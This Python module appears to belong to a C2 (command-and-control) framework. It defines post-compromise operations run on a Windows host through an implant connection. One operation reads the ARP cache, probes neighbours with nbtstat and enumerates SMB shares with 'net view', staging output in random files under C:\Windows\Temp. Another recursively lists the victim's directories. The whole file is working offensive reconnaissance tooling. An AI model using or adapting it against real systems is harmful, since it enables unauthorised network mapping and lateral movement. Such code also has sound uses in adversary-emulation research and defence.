from c2.c2_operations import C2Operation
from c2.c2_actions import C2Action
from c2.c2_facts import FactsStorage
from c2.c2_server import ConnectionStorage, read_c2_log
import c2.concrete_parsers as c2parsers
import c2.concrete_actions as concrete_actions
import uuid


# "Unsuccessful" means that it happened a fatal error that would make the Operation hang,
# not an application-level error like "can't open this file"
class UnsuccessfulAction(Exception):
    pass


class QuietScanNeighborShares(C2Operation):
    def __init__(self):
        name = "Scan local network to find network shares"
        description = "Read ARP cache to find neighbors, scan them to see which has Netbios/SMB " \
                      "sharing enabled, enumerate shares; this operation also enumerates local shares"
        super().__init__(name=name, description=description)
        self.generic = False

    def performOperation(self, connUuid: str):
        try:
            self.doOperation(connUuid)
        except UnsuccessfulAction:
            pass
        report = self.reportOperationState()
        return report

    def doOperation(self, connUuid: str):
        connectionStorage = ConnectionStorage()
        factsStorage = FactsStorage(connectionStorage, connUuid)
        medium_file = f'C:\\Windows\\Temp\\{uuid.uuid4().hex}.txt'
        self.performAction(connUuid, 'ipconfig', parser=c2parsers.ipconfig_parser,
                           out_facts='local_ip_addr', out_file=medium_file,
                           user_mode_cmd_latency=2)
        self.performAction(connUuid, 'arp -a', parser=c2parsers.arp_cache_parser,
                           out_facts='arp_entries', out_file=medium_file,
                           user_mode_cmd_latency=2)
        local_ip_addr = factsStorage.getFact('local_ip_addr')
        arp_entries = factsStorage.getFact('arp_entries')
        neighbors = [entry.split('@')[0] for entry in arp_entries]
        neighbors = [ip for ip in neighbors if ip.split('.')[-1] != '255']
        neighbors = [ip for ip in neighbors if ip.split('.')[0] != '127']
        is_multicast_prefix = lambda prefix: 224 <= prefix <= 239
        neighbors = [ip for ip in neighbors if not is_multicast_prefix(int(ip.split('.')[0]))]
        factsStorage.setFact('neighbors', neighbors)
        neighbors.append(local_ip_addr)
        max_retries = 10
        for neighbor in neighbors:
            if neighbor != local_ip_addr:
                cmd = f'nbtstat -A {neighbor}'
            else:
                cmd = 'nbtstat -n'
            only_read, i = False, 0
            while i < max_retries:
                self.performAction(connUuid, cmd, parser=c2parsers.nbtstat_parser,
                                   out_facts='smb_neighbors', enrich=True, out_file=medium_file,
                                   user_mode_cmd_latency=5, only_read=only_read)
                command_output = read_c2_log(connUuid, self.reported_actions[-1][1][-1])
                if 'error while opening specified file' in command_output:
                    only_read = True
                    i += 1
                else:
                    break
        smb_neighbors = factsStorage.getFact('smb_neighbors')
        for smb_neighbor in smb_neighbors:
            only_read, i = False, 0
            while i < max_retries:
                self.performAction(connUuid, f'net view \\\\{smb_neighbor} /all', out_file=medium_file,
                                   parser=c2parsers.net_view_parser, out_facts='shares', enrich=True,
                                   user_mode_cmd_latency=5, only_read=only_read)
                command_output = read_c2_log(connUuid, self.reported_actions[-1][1][-1])
                if 'error while opening specified file' in command_output:
                    only_read = True
                    i += 1
                else:
                    break
        report = self.reportOperationState()
        return report

    def performAction(self, connUuid, command, out_file='C:\\Windows\\Temp\\laccolith.txt',
                      parser=c2parsers.null_parser, out_facts=None, enrich=False,
                      user_mode_cmd_latency=0, only_read=False):
        action = self.user_mode_cmd(command, out_file, parser, out_facts, enrich, user_mode_cmd_latency,
                                    only_read)
        self.actions.append(action)
        cmd_indexes_list = action.performAction(connUuid)
        cmd_indexes_list = ", ".join([str(i) for i in cmd_indexes_list])
        if action.isSuccessful():
            self.reported_actions.append((action.name, cmd_indexes_list))
            self.num_completed += 1
        else:
            raise UnsuccessfulAction

    @staticmethod
    def user_mode_cmd(command, out_file='C:\\Windows\\Temp\\laccolith.txt', parser=c2parsers.null_parser,
                      out_facts=None, enrich=False, user_mode_cmd_latency=0, only_read=False):
        command_list = []
        if not only_read:
            command_line = f'cmd.exe /c "{command} > {out_file} 2>&1"'
            command_list += concrete_actions.run_user_mode_arbitrary_command(command_line).commandsList
        command_list.append(f'read \\??\\{out_file}')
        if out_facts is None:
            out_facts = []
        if isinstance(out_facts, str):
            out_facts = [out_facts]
        elif not isinstance(out_facts, list):
            raise ValueError('out_facts must either be of type str or list or None')
        name = f'User mode command: {command}'
        description = ''
        required_facts = []
        action = C2Action(command_list, parser, required_facts, name, description, out_facts)
        if enrich:
            action.enrichingKnowledgeAction()
        if user_mode_cmd_latency > 0:
            action.additionalLatency(user_mode_cmd_latency)
        return action


class IterativeDirectoryListing(C2Operation):
    def __init__(self, initial_directory):
        name = "Iterative directory listing"
        description = "List all files and directories in all sub-directories starting from an initial dir"
        super().__init__(name=name, description=description)
        self.initial_directory = initial_directory
        self.generic = False

    def performOperation(self, connUuid: str):
        try:
            self.doOperation(connUuid)
        except UnsuccessfulAction:
            pass
        report = self.reportOperationState()
        return report

    def doOperation(self, connUuid: str):
        connectionStorage = ConnectionStorage()
        factsStorage = FactsStorage(connectionStorage, connUuid)
        self.performAction(connUuid, dir_name=self.initial_directory, out_fact='staged_files')
        staged_files = factsStorage.getFact('staged_files')
        while len(staged_files) > 0:
            factsStorage.enrichFact('all_files', staged_files)
            self.performAction(connUuid, input_fact='staged_files', iterative=True)
            staged_files = factsStorage.getFact('staged_files')

    def performAction(self, connUuid, dir_name=None, input_fact=None, out_fact='staged_files',
                      iterative=False, enrich=False):
        action = self.dir_listing(dir_name, input_fact, out_fact, iterative, enrich)
        self.actions.append(action)
        cmd_indexes_list = action.performAction(connUuid)
        cmd_indexes_list = ", ".join([str(i) for i in cmd_indexes_list])
        if action.isSuccessful():
            self.reported_actions.append((action.name, cmd_indexes_list))
            self.num_completed += 1
        else:
            raise UnsuccessfulAction

    @staticmethod
    def dir_listing(dir_name=None, input_fact=None, out_fact='staged_files', iterative=False, enrich=False):
        if dir_name is not None:
            commands_list = [f"dir {dir_name}"]
            required_facts = []
        elif input_fact is not None:
            commands_list = ["dir {" + input_fact + '}']
            required_facts = [input_fact]
        else:
            raise ValueError("One of dir_name or input_fact must be not None")
        parser = c2parsers.generic_dir_parser
        name = "Directory listing"
        description = ""
        output_facts = [out_fact]
        action = C2Action(commands_list, parser, required_facts, name, description, output_facts)
        action.migrateFacts(input_fact, out_fact)
        if iterative:
            action.iterativeAction()
        if enrich:
            action.enrichingKnowledgeAction()
        return action
